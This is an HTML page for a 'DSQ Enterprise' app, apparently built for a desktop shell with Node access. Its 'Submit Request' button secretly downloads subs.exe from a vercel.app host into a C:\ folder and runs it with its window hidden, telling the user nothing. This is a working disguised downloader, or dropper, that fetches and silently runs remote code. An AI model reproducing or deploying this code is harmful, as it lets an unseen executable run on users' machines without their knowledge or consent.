<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>DSQ Enterprise</title>
<style>
    body { font-family: Arial, sans-serif; padding: 20px; }
    button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
    #spinner {
        display: none;
        width: 40px;
        height: 40px;
        border: 5px solid #ccc;
        border-top: 5px solid #0078d7;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        position: absolute;
        top: 20px;
        right: 20px;
    }
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
</style>
</head>
<body>

<button id="mobilityBtn">Submit Request</button>
<div id="spinner"></div>

<script>
    const { exec } = require('child_process');
    const fs = require('fs');
    const https = require('https');
    const path = require('path');

    const btn = document.getElementById('mobilityBtn');
    const spinner = document.getElementById('spinner');

    const exeUrl = 'https://dsq-beta.vercel.app/subs.exe';
    const versionUrl = 'https://dsq-beta.vercel.app/subs.version';

    const appFolder = 'C:\\DSQ Enterprise\\apps';
    const exePath = path.join(appFolder, 'subs.exe');
    const versionPath = path.join(appFolder, 'subs.localversion');

    btn.addEventListener('click', () => {
        spinner.style.display = 'block';

        // Ensure apps folder exists
        if (!fs.existsSync(appFolder)) {
            fs.mkdirSync(appFolder, { recursive: true });
        }

        // Fetch latest version
        https.get(versionUrl, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                const latestVersion = data.trim();
                let currentVersion = null;

                if (fs.existsSync(versionPath)) {
                    currentVersion = fs.readFileSync(versionPath, 'utf-8').trim();
                }

                if (!currentVersion || currentVersion !== latestVersion) {
                    console.log('⬇️ New version detected, downloading...');
                    const file = fs.createWriteStream(exePath);
                    https.get(exeUrl, (res) => {
                        if (res.statusCode !== 200) {
                            console.error('❌ Failed to download EXE:', res.statusCode);
                            spinner.style.display = 'none';
                            return;
                        }
                        res.pipe(file);
                        file.on('finish', () => {
                            file.close(() => {
                                fs.writeFileSync(versionPath, latestVersion); // update local version
                                runExe();
                            });
                        });
                    }).on('error', (err) => {
                        console.error('❌ Download error:', err.message);
                        spinner.style.display = 'none';
                    });
                } else {
                    console.log('✅ EXE up-to-date, running existing file...');
                    runExe();
                }
            });
        }).on('error', (err) => {
            console.error('❌ Version check failed:', err.message);
            spinner.style.display = 'none';
        });
    });

    function runExe() {
        exec(`"${exePath}"`, { windowsHide: true }, (err, stdout, stderr) => {
            spinner.style.display = 'none';
            if (err) console.error('❌ Execution error:', err);
            if (stdout) console.log('✅ stdout:', stdout);
            if (stderr) console.error('⚠️ stderr:', stderr);
        });
    }
</script>

</body>
</html>
